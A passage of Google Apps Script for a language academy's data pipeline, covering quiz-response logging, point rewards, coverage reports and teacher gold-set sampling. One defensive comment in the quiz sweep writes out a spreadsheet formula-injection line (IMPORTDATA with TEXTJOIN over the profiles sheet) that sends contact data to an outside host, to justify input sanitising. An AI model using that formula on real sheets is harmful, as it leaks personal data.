  if (재원 && 활동.size < 재원 * 0.5) L.push('  ⚠️ 절반 아래입니다 — 총량이 늘어도 이 숫자가 내려가면 압축이 접속을 깎고 있다는 뜻입니다(끈 기능을 되살릴 판단 재료).');

  // ⑥ [v9.147] 강사 정답 모음 — 학생이 아니라 **정답**을 쌓는 칸. 이게 비면 2년 뒤 모델 선택을 감으로 한다
  const gd = ss.getSheetByName('teacher_gold');
  let 표본 = 0, 응답G = 0, 수정 = 0;
  // [v9.207] 이 리포트의 나머지 다섯 읽기와 같은 모양으로 — 여기만 상수 폭을 그대로 요구해 비대칭이었다.
  //   GOLD_HEADERS 는 이번에 안 늘렸으니 오늘 새는 것은 없지만, 늘리는 날 정확히 quiz·talk 가 겪은 사고가 난다.
  const gw = gd ? Math.min(GOLD_HEADERS.length, gd.getLastColumn()) : 0; // 읽는 칸은 r[6]·r[7]
  if (gd && gd.getLastRow() >= 2) gd.getRange(2, 1, gd.getLastRow() - 1, gw).getValues().forEach(r => {
    표본++;
    const v = String(r[6] || '').trim(); // G 강사판정
    if (v) 응답G++;
    if (String(r[7] || '').trim()) 수정++; // H 강사교정
  });
  L.push('');
  L.push('■ 강사 교정 정답 모음 (2년 뒤 「어느 모델이 우리 학생에게 맞는가」의 채점표)');
  L.push('  표본 ' + 표본 + '건 · 강사 응답 ' + 응답G + '건 · 그중 교정 수정 ' + 수정 + '건');
  if (표본 && !응답G) L.push('  ⚠️ 표본은 뽑히는데 응답이 0 — 강사가 그 탭을 안 보고 있습니다(유인이 0인 업무라 예상된 실패 모드입니다).');
  else if (응답G && 수정 === 응답G) L.push('  ⚠️ 전부 「고칠 곳이 있다」로만 쌓였습니다 — 「AI가 맞았다」 라벨이 0이면 재현율을 못 재는 반쪽 채점표가 됩니다.');

  const head = '📊 학습 데이터 커버리지 — ' + Utilities.formatDate(new Date(), ss.getSpreadsheetTimeZone(), 'yyyy-MM-dd') + '\n'
    + '(「2년 축적 → AI 회화 앱」 진척. 중요한 것은 총량이 아니라 **비어 있는 유형**입니다)\n\n';
  const report = head + L.join('\n')
    + '\n\n다음 수: 빈 유형이 있으면 그 문법을 겨냥한 숙제·퀴즈를 다음 시즌에 넣으세요 — 안 나오는 오류는 안 쌓입니다.';
  Logger.log(report);
  if (opts && opts.raw) {
    return { text: report, stats: {
      빈유형: 빈칸, 재원: 재원, 활동: 활동.size,
      골든표본: 표본, 골든응답: 응답G, 골든수정: 수정,
      첨삭: 첨삭, 태그있음: 태그있음, 퀴즈응답: 응답, 대화턴: 턴
    } };
  }
  return report;
}

/* [v9.166] 커버리지 월간 자동 발화 — 계기판이 시트 메뉴에만 있으면 아무도 안 누른다.
 * 지침 「스스로 발화하지 않는 장치는 안 돈다」의 실측 사례가 바로 이 파일 안에 있었다:
 * 강사 정답 모음은 weeklyJobs에 걸려 매주 표본을 뽑는데, **그 표본이 비어 있는지 알려주는 계기판은
 * 사람이 눌러야만 돌았다.** 예상 실패 모드를 미리 적어둬도 아무도 안 열면 값이 0이다.
 *
 * 침묵의 규칙 2개 — 빨간불 피로가 이 장치를 죽이는 유일한 경로라서:
 *   ① **재원 0명이면 통째로 침묵**한다. 개원 전엔 데이터 0이 정상이고, 매달 경고를 보내면
 *      정작 데이터가 쌓이기 시작하는 개원 시점엔 이미 안 읽는 메일이 되어 있다.
 *   ② 문제 없으면 침묵한다. **보낼지 말지의 기준은 dataCoverageReport 안의 ⚠️ 한 벌뿐**이다 —
 *      여기서 임계값을 새로 정하면 두 벌이 되어 조용히 갈린다.
 *      (아래 처방 문구의 조건은 「무엇을 적을까」일 뿐이라, 하나도 안 맞아도 리포트 전문은 그대로 나간다.
 *       그래야 리포트에 새 ⚠️가 생겼는데 여기 처방이 없어서 침묵하는 구멍이 안 생긴다.)
 * 그리고 진단만 하고 처방이 없으면 결국 손일로 돌아오므로 「이번 달 할 것」을 함께 적는다. */
function dataCoverageMonthly_() {
  const r = dataCoverageReport({ raw: true });
  if (!r || !r.stats) return;
  const s = r.stats;
  if (!s.재원) { Logger.log('커버리지 월간 — 재원 0명이라 침묵(개원 전 정상)'); return; }
  if (r.text.indexOf('⚠️') === -1) { Logger.log('커버리지 월간 — 경고 없음, 메일 생략'); return; }

  const 처방 = [];
  if (s.골든표본 && !s.골든응답) 처방.push(
    '① 정답 모음에 강사 응답이 0건입니다 — 강사 화면의 「정답 모음」이 열려 있는지, 강사가 주 5건을 채우고 있는지 보세요.\n' +
    '   이 칸이 비면 2년 뒤 「어느 AI가 우리 학생에게 맞는가」를 감으로 고릅니다. 소급 불가(강사를 다시 앉힐 수 없음).');
  if (s.골든응답 && s.골든수정 === s.골든응답) 처방.push(
    '① 강사 정답 모음이 전부 「고칠 곳이 있다」로만 쌓였습니다 — 「AI가 맞았다」 라벨이 0이면 재현율을 못 잽니다.\n' +
    '   강사에게 「AI 교정이 이미 맞으면 그대로 통과시켜 주세요」를 한 번 안내하세요.');
  if (s.빈유형 && s.빈유형.length) 처방.push(
    '② 아직 한 건도 못 잡은 오류 유형 ' + s.빈유형.length + '종 — 다음 시즌 숙제·퀴즈에 이 문법을 넣으세요:\n' +
    '   ' + s.빈유형.slice(0, 3).join(' · ') + (s.빈유형.length > 3 ? ' (외 ' + (s.빈유형.length - 3) + '종은 아래 리포트에)' : ''));
  if (s.활동 < s.재원 * 0.5) 처방.push(
    '③ 최근 7일 참여 ' + s.활동 + '/' + s.재원 + '명 — 분모가 마르면 총량이 늘어도 유형은 안 채워집니다.');
  /* [v9.176] 정답이 쌓였는데 **나갈 통로가 안 열려 있으면** 여기서 말한다.
   *   설치가 6개월 뒤에나 값을 하는 종류라, 안 해도 그 사이 아무 일도 안 일어난다 —
   *   그래서 잊히면 「채점표는 있는데 회화 앱이 못 읽는」 상태로 2년이 간다.
   *   토큰 **존재 여부만** 본다(값은 읽지도 쓰지도 않는다). */
  if (s.골든응답 && !PropertiesService.getScriptProperties().getProperty(GH_TOKEN_KEY)) 처방.push(
    '④ 강사 정답 모음 응답 ' + s.골든응답 + '건이 쌓였는데 회화 앱으로 보낼 통로가 아직 안 열려 있습니다.\n' +
    '   docs/골든픽스처_자동전송_설치.md 의 1단계(GitHub 토큰)를 한 번 하시면 시트 메뉴 클릭 한 번으로 끝납니다.\n' +
    '   (안 하셔도 「📤 …픽스처 내보내기」로 파일을 받아 옮기는 길은 그대로 있습니다.)');

  if (!quotaOk(1)) return;
  const body = '이번 달 손볼 곳입니다. 문제가 없으면 이 메일은 오지 않습니다.\n\n'
    + (처방.length ? 처방.join('\n\n') + '\n\n' : '')
    + '────────────────\n\n' + r.text;
  MailApp.sendEmail(ADMIN_EMAIL, '[SYNK] 📊 학습 데이터 — 손볼 곳 ' + 처방.length + '건', body);
  Logger.log('커버리지 월간 메일 발송(처방 ' + 처방.length + '건)');
}

/* 학생별 퀴즈 폼 링크 — SIDTOKEN·QZTOKEN 두 자리를 함께 치환한다(formUrlOf는 sid 한 자리 전용).
 * 퀴즈ID가 없으면 **빈 링크를 준다**: ID 없는 응답은 "무엇에 대한 답인지 모르는 답"이라 해석이 불가능하고,
 * 그런 행이 섞이면 2년치 집계에서 분모만 키운다 — 안 받는 편이 낫다. */
function quizFormUrlOf_(tmpl, sid, qid) {
  if (!tmpl || !qid) return '';
  return String(tmpl).replace(/SIDTOKEN/g, encodeURIComponent(sid)).replace(/QZTOKEN/g, encodeURIComponent(qid));
}

/* [v9.138] 퀴즈폼_응답 → quiz_log 전개(10분 스위프 편승).
 * 포인터 전진 규약은 sweepAttendanceForm_과 동일 — 재실행해도 행이 늘지 않는다.
 * ⚠ 무효 행(미등록 sid)도 **버리되 통보**한다(notifyDroppedSids_) — 조용한 드롭은 결함을 영원히 숨긴다. */
function quizSweep_(ss) {
  const src = ss.getSheetByName('퀴즈폼_응답');
  if (!src || src.getLastRow() < 2) return;
  const props = PropertiesService.getScriptProperties();
  const last = src.getLastRow();
  const from = Number(props.getProperty('퀴즈폼_포인터')) || 1;
  if (from > last) { props.setProperty('퀴즈폼_포인터', String(last)); return; }
  if (from >= last) return;
  const tz = ss.getSpreadsheetTimeZone();
  const rows = src.getRange(from + 1, 1, last - from, 5).getValues(); // 타임스탬프·학생ID·퀴즈ID·내 답·확신도

  // [v9.187] 폭 67 — 급수(BO67) 스냅샷 재료. 첨삭·대화 배치와 같은 위치 규약(r[66]).
  //   새 행이 있을 때만 여기 오므로(위 포인터 조기 반환) 10분 스위프의 상시 비용은 늘지 않는다.
  const valid = new Set(), lvOf = {};
  const pf = ss.getSheetByName('profiles');
  if (pf && pf.getLastRow() >= 2) pf.getRange(2, 1, pf.getLastRow() - 1, 67).getValues().forEach(r => {
    if (r[0] && r[3] === 'student') { const k = String(r[0]).trim(); valid.add(k); lvOf[k] = Number(r[66]) || 0; }
  });

  // 문항 스냅샷 재료 — contents A=ID · B=유형 · C=분류 · D='문제|정답'
  const qMap = {};
  const ct = ss.getSheetByName('contents');
  if (ct && ct.getLastRow() >= 2) ct.getRange(2, 1, ct.getLastRow() - 1, 4).getValues().forEach(r => {
    if (String(r[1] || '') !== 'quiz' || !r[0]) return;
    const parts = String(r[3] || '').split('|');
    qMap[String(r[0]).trim()] = { cat: String(r[2] || ''), q: parts[0] || '', a: parts.length > 1 ? parts.slice(1).join('|') : '' };
  });

  /* [v9.188] 개인 퀴즈(AIQ-yyyy-MM-dd) 문항 스냅샷 — contents에 없고 **ai_daily에만** 있다.
   *   여기서 안 담으면 문제·정답 칸이 영원히 빈 채로 남는다: 「무엇을 물었는지 모르는 답」은
   *   3년차 봇 학습 재료가 되지 못한다(제품방향 §설계 불변식 2 — 원문 보존).
   *   키에 sid를 함께 넣는 이유: 개인 퀴즈는 **학생마다 문제가 다르다**(contents 퀴즈는 전교 공용).
   *   정답 칸은 "정답: X — 해설(몽골어)" 형식이라 접두어를 벗겨야 quizAnswerKeys_가 X를 키로 뽑는다.
   * ⚠ 한계(정직하게): ai_daily는 오늘·어제만 들고 있어, 이틀 넘게 지연된 응답은 스냅샷이 빈다.
   *   그때도 **응답 원문·퀴즈ID·날짜는 남고** 문항은 ai_daily_archive에 보존되므로 나중에 조인할 수 있다. */
  const adQ = ss.getSheetByName('ai_daily');
  if (adQ && adQ.getLastRow() >= 2) adQ.getRange(2, 1, adQ.getLastRow() - 1, 5).getValues().forEach(r => {
    const sidA = String(r[0] || '').trim(), dA = String(r[1] || '').trim();
    if (!sidA || !dA || !String(r[3] || '')) return;
    qMap['AIQ-' + dA + '|' + sidA] = { cat: '개인퀴즈', q: String(r[3]),
      a: String(r[4] || '').replace(/^\s*정답\s*[:：]\s*/, '') };
  });

  const ql = ensureSheet(ss, 'quiz_log', QUIZ_LOG_HEADERS);
  헤더보정_(ql, QUIZ_LOG_HEADERS); // [v9.187] 이미 서 있는 11열 시트에 급수 이름표 — 없으면 새 칸이 조용히 버려진다
  /* [v9.312] '퀴즈ID|sid' → 지금까지 센 시도 수. 구 코드는 둘째 답을 **버렸다**(「고쳐 낸 답은 무엇을 골랐나를 오염시킨다」) —
   *   그런데 철학 Ⅲ-2(v1.21)는 「아는가의 판정은 다시 낸 문항의 결과가 한다」라 둘째 답이 곧 판정 재료다. 버리면 소급이 안 된다
   *   (심문 3회차 A3 · 4회차 A3 · 첫 진짜 학생 «전»). 이제 **시도 번호를 달아 전부 남긴다** — 「무엇을 골랐나」는 시도 1 행이 그대로 쥐고,
   *   소비자(aiWeakMap_)는 시도 1 만 읽는다. */
  /* [v9.312] 적재됨 = '퀴즈ID|sid|응답시각ms' → 이미 적재한 «응답». 적재(아래 setValues) 뒤 포인터 저장만 실패하면 다음 스위프가 같은
   *   원본 행을 다시 읽는데, 그것은 재제출이 아니라 재처리다(구 코드는 seen 이 조용히 걸렀고, 시도 번호를 달자 둘째 시도로 새 행이 됐다 —
   *   코덱스 09-06 2차 P1). 응답의 정체는 «폼이 찍은 시각(ms)»이다 — 같은 날 같은 답을 다시 내도, 확신도만 바꿔 내도 시각이 다르니
   *   다른 응답으로 남는다(원신호 보존 · 철학 A-1). 날짜·답으로 가르던 판은 그 둘을 버렸다(3차 P1 4a682b0d875b). 옛 행(응답시각 칸 없음)은
   *   재처리 판정에서 빠진다 — 그 행들의 포인터는 이미 저장돼 있어 다시 읽힐 일이 없다. */
  const seen = {}, 적재됨 = {};
  const 시도칸 = QUIZ_LOG_HEADERS.indexOf('시도'), 응답ms칸 = QUIZ_LOG_HEADERS.indexOf('응답시각ms');
  if (ql.getLastRow() >= 2) ql.getRange(2, 1, ql.getLastRow() - 1, QUIZ_LOG_HEADERS.length).getValues().forEach(r => {
    if (!r[1] || !r[2]) return;
    const k = String(r[2]).trim() + '|' + String(r[1]).trim();
    const n = Number(r[시도칸]) || 1; // 옛 행(시도 칸 없음)은 1
    if (n > (seen[k] || 0)) seen[k] = n;
    const ms = Number(r[응답ms칸]) || 0;
    if (ms) 적재됨[k + '|' + ms] = 1;
  });

  const out = [], badSid = [], 재처리 = []; // 재처리 = 로그엔 이미 있는 응답(sid 만 쓴다 · 하루 보상을 다시 태우는 재료)
  rows.forEach(r => {
    const ts = r[0] instanceof Date ? r[0] : new Date();
    const sid = String(r[1] || '').trim();
    const qid = String(r[2] || '').trim();
    const ans = String(r[3] || '').trim().slice(0, 300); // 폭주 입력 상한(숙제폼 2000자 패턴)
    const conf = String(r[4] || '').trim();
    if (!sid || !qid || !ans) return;
    if (!valid.has(sid)) { badSid.push(sid); return; }
    const key = qid + '|' + sid;
    const 응답ms = ts.getTime();
    const 응답키 = key + '|' + 응답ms;
    if (적재됨[응답키]) { 재처리.push(['', sid]); return; } // [v9.312] 같은 응답의 재처리 — 로그엔 안 쌓고 하루 보상만 다시 태운다(멱등)
    적재됨[응답키] = 1;
    const 시도 = (seen[key] || 0) + 1;
    seen[key] = 시도;
    const meta = qMap[qid + '|' + sid] || qMap[qid] || { cat: '', q: '', a: '' }; // [v9.188] 개인 퀴즈는 (문항ID, 학생) 짝으로 찾는다
    /* [v9.312] 노출 판 — 학생이 «본 문항 판»은 폼이 안 실어 보낸다(소급 불가 · 심문 1·3·4회차 A2). 대신 스위프가 붙인 문항의
     *   지문(문제|정답 해시)과 «응답에서 스냅샷까지 걸린 초»를 남긴다. 그러면 뒤에 문항이 개정됐을 때 「이 답이 어느 판을 봤나」를
     *   지문으로 가르고, 지연이 큰 행(개정과 겹칠 수 있는 행)을 재채점에서 걸러낼 수 있다. 판을 «안다»고 적는 것이 아니라
     *   «무엇을 붙였나»를 적는 것이다 — 폼이 판을 실어 보내는 날 그 값이 이 칸을 대신한다. */
    const 지문 = 문항지문_(meta.q, meta.a);
    const 지연초 = Math.max(0, Math.round((Date.now() - ts.getTime()) / 1000));
    const g = quizGrade_(ans, meta.a);
    /* 🔒 셀 수식 인젝션 차단 — 학생이 낸 답이 `=`로 시작하면 시트가 그것을 **수식으로 실행**한다.
     *   이 스프레드시트에는 profiles(학생·보호자 연락처)가 함께 있어,
     *   `=IMPORTDATA("...?d="&TEXTJOIN(",",1,profiles!B2:B60))` 한 줄로 개인정보가 외부로 나간다
     *   — 사람이 셀을 클릭할 필요도 없다(시트가 스스로 평가한다).
     *   상담AI가 페이스북 텍스트를 받으며 같은 이유로 셀안전_를 도입했다(v9.137) — 학생 입력도 남의 글이다. */
    /* [v9.188] 문항 스냅샷 3칸에도 셀안전_ — 구 코드는 이 셋만 맨몸이었다(출처가 contents=우리 콘텐츠라서).
     *   그런데 개인 퀴즈부터 출처가 **AI 생성물**이고, 그 재료는 학생의 약점 메모·첨삭이다
     *   → 학생이 숙제에 `=IMPORTDATA(...)`를 써넣으면 약점 재료 → 프롬프트 → ai_daily → 여기로 흘러올 수 있다.
     *   경로가 길다고 안 오는 것은 아니다. 값은 그대로 두고 선두 문자만 무력화하니 학습 재료도 안 상한다. */
    out.push(['QL' + Utilities.formatDate(ts, tz, 'yyyyMMdd') + '-' + sid + '-' + qid + (시도 > 1 ? '-' + 시도 : ''), sid, 셀안전_(qid),
      셀안전_(meta.cat), 셀안전_(meta.q), 셀안전_(ans), 셀안전_(meta.a),
      g.ok === null ? '판정보류' : (g.ok ? '정답' : '오답'), // 원칙: 판정 못 해도 행은 남는다
      셀안전_(conf), dstr(ts, tz), new Date(), lvOf[sid] || 0, SCHEMA_VER, // [v9.187] 급수 스냅샷(0=미정) · [v9.207] schema_ver
      시도, 지문, 지연초, 응답ms]); // [v9.312] 시도 번호 · 문항 지문 · 스냅샷 지연초 · 응답시각ms(재처리를 가르는 정체)
  });
  if (out.length) ql.getRange(ql.getLastRow() + 1, 1, out.length, QUIZ_LOG_HEADERS.length).setValues(out);
  notifyDroppedSids_('퀴즈폼', badSid);
  if (out.length || 재처리.length) Logger.log('퀴즈 응답 ' + out.length + '건 적재(quiz_log)' + (재처리.length ? ' · 재처리 ' + 재처리.length + '건은 로그 없이 보상만' : ''));
  /* [v9.147] 적재된 응답에만 지급 — 지급이 적재보다 앞서면 "받았는데 안 쌓인 답"이 생긴다.
   * [v9.312] 재처리 행(로그엔 이미 있는 응답)도 함께 넘긴다 — 지급은 학생·날짜로 멱등이라 두 번 가지 않고, 앞 실행이 적재 뒤·지급 «전»에
   *   죽었으면 여기서 채워진다(코덱스 3차 P1 c7ab1456a3bb). 포인터 저장은 맨 «뒤»다 — 지급이 죽어도 다음 스위프가 같은 행을 다시 읽어
   *   (로그는 안 쌓고) 지급만 다시 태운다. */
  퀴즈응답포인트_(ss, out.concat(재처리), tz);
  props.setProperty('퀴즈폼_포인터', String(last));
}

/* [v9.147] 🎯 퀴즈 응답 포인트 — 「데이터를 낳는 행동」에 보상을 옮기는 두 경로 중 하나(다른 하나는 재작성).
 * 설계 결정 3개:
 *   ① **정답 여부와 무관하게 지급한다.** 정답에만 주면 확신도 3택이 거짓말을 시작한다 — '찍었어요'를 고르면
 *      손해라고 느끼는 순간 그 축이 죽고, 확신도는 quiz_log에서 가장 값비싼 열이다(정답인데 찍음 = 모르는 것).
 *   ② **1일 1회 상한.** 퀴즈는 10초짜리 행동이라 무제한이면 파밍이 되고, 파밍된 응답은 데이터도 오염시킨다.
 *   ③ 지급은 **적재 뒤**에만(위 호출 위치) — 순서가 뒤집히면 "포인트는 받았는데 로그엔 없는" 행이 생긴다.
 * 멱등: 오늘 이미 '퀴즈응답'을 받은 학생은 건너뛴다(sweepFeedbackAck_ 패턴) + DAILY_LIMIT 야간 정정이 2차 그물. */
function 퀴즈응답포인트_(ss, loaded, tz) {
  if (!loaded || !loaded.length) return;
  const today = Utilities.formatDate(new Date(), tz, 'yyyy-MM-dd');
  const doneToday = new Set();
  const pl = ss.getSheetByName('point_logs');
  if (pl && pl.getLastRow() >= 2) pl.getRange(2, 1, pl.getLastRow() - 1, 6).getValues().forEach(r => {
    if (r[1] && r[5] && String(r[3] || '') === '퀴즈응답' &&
        Utilities.formatDate(asDate_(r[5]), tz, 'yyyy-MM-dd') === today) doneToday.add(String(r[1]).trim());
  });
  const grants = [];
  loaded.forEach(row => {
    const sid = String(row[1] || '').trim();
    // 이 스위프에서 같은 학생이 3문항을 냈어도 1회 — doneToday에 즉시 넣어 루프 안에서도 상한이 선다
    if (!sid || doneToday.has(sid)) return;
    doneToday.add(sid);
    grants.push([sid, PT.퀴즈응답, '퀴즈응답', '시스템']);
  });
  if (grants.length) appendPoints(ss, grants);
}

/* ═══════════════ [v9.147] 🔁 재작성 보상 — 3단 데이터의 마지막 단에 유인을 붙인다 ═══════════════
 * 「교정을 받고 실제로 고쳐 썼는가」는 학습이 일어났는지의 유일한 신호인데, 이 행동에는 보상이 0이었다
 * (숙제 제출·첨삭 확인 탭에는 있었다). 기능 압축의 핵심 교환 = 손일의 몫을 데이터를 낳는 행동으로 옮긴다.
 *
 * 🔴 **복붙 게이트가 이 보상의 전제다.** 무인 발행(AI_FEEDBACK_AUTOPUBLISH=true)이라 학생은 교정문을 먼저 본다 —
 *   제출 자체에 포인트를 걸면 합리적 학생은 교정문을 그대로 에코한다. 그러면 3단의 마지막 단이 「몽골어 화자의
 *   언어」가 아니라 **모델 출력의 복제물**이 되어, 이 데이터의 값(유형 커버리지) 자체가 훼손된다.
 * ⚠ 잡는 것은 「그대로 베낀 것」뿐이다 — 교정문을 참고해 자기 말로 다시 쓰는 것은 정상 학습이고 막지 않는다.
 * ⚠ 상한(주 1회)은 **지급 상한이지 재작성 횟수 제한이 아니다** — 더 써도 데이터는 전부 쌓인다.
 * ⚠ 이 게이트는 지급만 막는다. 지급을 못 받은 재작성도 hw_feedback에는 그대로 남는다(수집이 채점보다 우선). */
/* 정규화 후 교정문이 제출문의 이 비율 이상을 덮으면 「그대로 베낌」으로 본다.
 * 0.7인 이유(회귀가 정한 값): 0.8에서는 **교정문을 통째로 붙이고 "감사합니다" 다섯 글자만 더한 제출이
 *   통과**했다(tests/기능압축.test.js 가 잡았다 — ⚠삭제됨 08-19 e75fc7fc). 0.7이면 그건 막히고, 교정문 뒤에 자기 문장을 한 줄
 *   더 쓴 제출(새 글이 30%를 넘음)은 통과한다 — 후자는 막으면 안 되는 정상 학습이다. */
const REWRITE_ECHO_RATIO = 0.7;
const REWRITE_COOLDOWN_DAYS = 7;  // 지급 상한 주기(주 1회)

/* 정규화 — 공백·문장부호·대소문자를 걷어낸다. "띄어쓰기만 바꾼 복붙"이 게이트를 통과하지 않게. */
function 재작성정규화_(s) {
  return String(s || '').toLowerCase().replace(/[\s.,!?~"'()‘’“”]/g, '');
}

/* 에코 판정 — 교정문이 없으면(첨삭 실패·구 행) 판정 불가라 **지급한다**
 *   (「모름」을 불리하게 세지 않는다 — 결석 복귀율에서 세운 원칙과 같다). */
function 재작성에코_(text, corrected) {
  const a = 재작성정규화_(text), b = 재작성정규화_(corrected);
  if (!a || !b) return false;
  if (a === b) return true;
  if (a.indexOf(b) > -1 && b.length >= a.length * REWRITE_ECHO_RATIO) return true;
  return false;
}

/* 배치 1회분 준비 — hw_feedback(id→고친문장)과 최근 지급 이력을 각 1회만 읽는다.
 * 재작성 제출이 한 건도 없는 밤에는 호출되지 않는다(호출부가 첫 재작성에서 지연 생성). */
function 재작성준비_(ss, tz) {
  const corr = {};
  const fb = ss.getSheetByName('hw_feedback');
  if (fb && fb.getLastRow() >= 2) fb.getRange(2, 1, fb.getLastRow() - 1, 5).getValues().forEach(r => {
    if (r[0]) corr[String(r[0]).trim()] = String(r[4] || ''); // A id · E 고친문장
  });
  const recent = new Set();
  const since = new Date(Date.now() - REWRITE_COOLDOWN_DAYS * 86400000);
  const pl = ss.getSheetByName('point_logs');
  if (pl && pl.getLastRow() >= 2) pl.getRange(2, 1, pl.getLastRow() - 1, 6).getValues().forEach(r => {
    if (r[1] && r[5] && String(r[3] || '') === '재작성' && asDate_(r[5]) >= since) recent.add(String(r[1]).trim());
  });
  return { corr: corr, recent: recent, grants: [], echo: 0, tz: tz };
}

/* 한 행 판정 — 지급 대상이면 grants에 쌓는다(실지급은 배치 끝에 1회). 반환값은 로그·집계용 사유. */
function 재작성판정_(prep, sid, text, reDo) {
  if (!prep || !sid || !reDo) return '';
  if (prep.recent.has(sid)) return '상한';                              // 주 1회 — 이번 주 이미 받음
  if (재작성에코_(text, prep.corr[reDo])) { prep.echo++; return '에코'; } // 교정문 복붙 — 무지급
  prep.recent.add(sid);
  prep.grants.push([sid, PT.재작성, '재작성', '시스템']);
  return '지급';
}

function 재작성지급_(ss, prep) {
  if (!prep || !prep.grants.length) return;
  appendPoints(ss, prep.grants);
  Logger.log('재작성 보상 ' + prep.grants.length + '건 지급' + (prep.echo ? ' · 에코 ' + prep.echo + '건 무지급' : ''));
}

/* ═══════════════ [v9.147] 🥇 강사 교정 정답 모음 — 2년 뒤 모델 선택의 채점표 ═══════════════
 * 문제: AI 첨삭이 무인 발행이라 **「강사가 실제로 한 교정」이 어디에도 안 남는다.** 2년치 학생 데이터가 있어도
 *   "어느 모델이 우리 학생에게 더 나은 교정을 하는가"는 **정답이 붙은 평가 세트** 없이는 못 잰다 —
 *   없으면 2년 뒤에도 감으로 고른다. 나중에 만들려면 강사를 다시 앉혀야 하므로 그릇은 지금 만든다.
 *
 * 🔑 **무작위 표본**이 이 설계의 핵심이다(적대 리뷰가 잡은 편향):
 *   강사에게 "틀린 걸 골라 고쳐 주세요"라고 하면 눈에 띄게 틀린 것만 쌓여 「AI가 맞았다」 라벨이 0이 된다 —
 *   정밀도만 있고 재현율이 없는 **반쪽 채점표**가 된다. 그래서 매주 무작위 n건을 뽑아 그 카드에 대해 묻는다
 *   ("이 교정, 그대로 두시겠어요? 고치시겠어요?"). **동의도 답이고 수정도 답이다.**
 * 🔑 **평가 전용이다 — 발행된 첨삭을 소급 정정하지 않는다.** 학생이 이미 본 카드를 뒤늦게 바꾸면
 *   3단 데이터(원문→교정→재작성)의 정합이 깨진다(어느 교정에 대한 재작성인지 모호해진다).
 *   강사가 "이건 학생에게 다시 알려야 한다"고 판단하면 그건 수업에서 말하는 일이고, 이 시트의 일이 아니다.
 * ⚠ 운용 시작 = **파일럿 첫 첨삭 발행 시점**(지금은 실학생 0명이라 표본이 안 뽑힌다). 그릇만 먼저 둔다. */
const GOLD_HEADERS = ['id', 'fb_id', 'student_id', '제출일', '원문', 'AI교정', '강사판정', '강사교정', '사유', '오류태그', '강사', 'created_at'];
const GOLD_VERDICTS = ['AI 교정이 맞다', '고칠 곳이 있다', '원문이 이미 맞다'];
const GOLD_SAMPLE_PER_WEEK = 5; // 주당 무작위 표본 — 강사 1인 5건이 현실적 상한(유인이 0인 업무다)

/* 표본 추출 — 지난 7일 '노출' 카드 중 아직 안 뽑힌 것에서 무작위 n건. 매주 월요일 1회(weeklyJobs).
 * 무작위성은 hashPick_ 같은 결정적 해시가 아니라 진짜 난수를 쓴다 — 결정적이면 같은 학생·같은 유형이
 * 매주 뽑혀 표본이 한쪽으로 굳는다(그게 정확히 이 시트가 피하려는 편향이다). */
function goldenSampleWeekly_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const fb = ss.getSheetByName('hw_feedback');
  if (!fb || fb.getLastRow() < 2) return;
  const tz = ss.getSpreadsheetTimeZone();
  const gold = ensureSheet(ss, 'teacher_gold', GOLD_HEADERS);
  const already = new Set();
  if (gold.getLastRow() >= 2) gold.getRange(2, 2, gold.getLastRow() - 1, 1).getValues().forEach(r => {
    if (r[0]) already.add(String(r[0]).trim());
  });
  const since = new Date(Date.now() - 7 * 86400000);
  const pool = [];
  fb.getRange(2, 1, fb.getLastRow() - 1, 13).getValues().forEach(r => {
    const id = String(r[0] || '').trim();
    if (!id || already.has(id)) return;
    if (!노출카드_(r[8])) return;      // I 상태 — 학생에게 실제로 나간 카드만이 평가 대상이다 · 판정 정본=노출카드_
    if (!String(r[4] || '').trim()) return;          // E 고친문장 없음(오류 행)
    const d = r[2] ? asDate_(r[2]) : null;
    if (!d || d < since) return;
    pool.push({ id: id, sid: String(r[1] || ''), d: dstr(r[2], tz), src: String(r[3] || ''), corr: String(r[4] || ''), tags: String(r[12] || '') });
  });
  if (!pool.length) return;
  for (let i = pool.length - 1; i > 0; i--) { // Fisher-Yates — slice(0,n)만 하면 시트 순서(=시간순)가 그대로 표본이 된다
    const j = Math.floor(Math.random() * (i + 1));
    const t = pool[i]; pool[i] = pool[j]; pool[j] = t;
  }
  const pick = pool.slice(0, GOLD_SAMPLE_PER_WEEK);
  const now = new Date();
  const rows = pick.map((p, i) => ['GD' + Utilities.formatDate(now, tz, 'yyyyMMdd') + '-' + (i + 1),
    p.id, p.sid, p.d, 셀안전_(p.src), 셀안전_(p.corr), '', '', '', p.tags, '', now]);
  gold.getRange(gold.getLastRow() + 1, 1, rows.length, GOLD_HEADERS.length).setValues(rows);
  Logger.log('강사 정답 모음 표본 ' + rows.length + '건 적재(teacher_gold)');
}

const FIXTURE_MIN_LEN = 2; // diff 어절 최소 길이 — 1글자(을·를·이)는 우연히 겹쳐 근거가 못 된다

/* [v9.166] 셀안전_의 역연산 — 선행 아포스트로피를 **그 뒤가 수식 문자일 때만** 벗긴다.
 * Sheets가 왕복 과정에서 이미 소비했으면 no-op이고, 남아 있으면 정확히 하나만 제거한다.
 * (일반 문장이 정당하게 쓴 아포스트로피는 건드리지 않는다 — 조건을 뒤 문자에 걸어서.) */
function 역소독_(v) {
  const s = String(v == null ? '' : v);
  return /^'[=+\-@\t\r]/.test(s) ? s.slice(1) : s;
}

/* [v9.166] 원문↔교정의 어절 차이로 「반드시 나와야/나오면 안 되는 말」을 뽑는다.
 * 한국어는 조사가 어절에 붙어 있어 어절 단위 diff가 교정 지점과 잘 맞는다
 * (「저가 몽골 사람입니다」→「저는 …」이면 불포함 [저가]·포함 [저는]).
 * 🔑 확실하지 않으면 **빈 배열을 준다** — 빈 배열은 그 검사를 건너뛸 뿐 실패시키지 않는다.
 *   추측한 단어를 넣으면 채점기가 엉뚱한 것을 재고, 그건 「틀린 채점표」라 없느니만 못하다.
 *   (talk repo 픽스처의 「확신 없는 것을 확실한 것처럼 적지 않는다」와 같은 규칙) */
function fixtureDiff_(원문, 교정) {
  const a = String(원문 || '').trim().split(/\s+/).filter(Boolean);
  const b = String(교정 || '').trim().split(/\s+/).filter(Boolean);
  if (!a.length || !b.length) return { 포함: [], 불포함: [] };
  const setA = {}, setB = {};
  a.forEach(w => { setA[w] = 1; });
  b.forEach(w => { setB[w] = 1; });
  const 불포함 = a.filter(w => !setB[w] && w.length >= FIXTURE_MIN_LEN);
  const 포함 = b.filter(w => !setA[w] && w.length >= FIXTURE_MIN_LEN);
  // 전면 재작성이면 diff가 문장 전체가 되어 「이 단어가 교정의 핵심」이라는 의미를 잃는다.
  const 변화 = Math.max(포함.length, 불포함.length) / Math.max(a.length, b.length);
  if (변화 > 0.5) return { 포함: [], 불포함: [] };
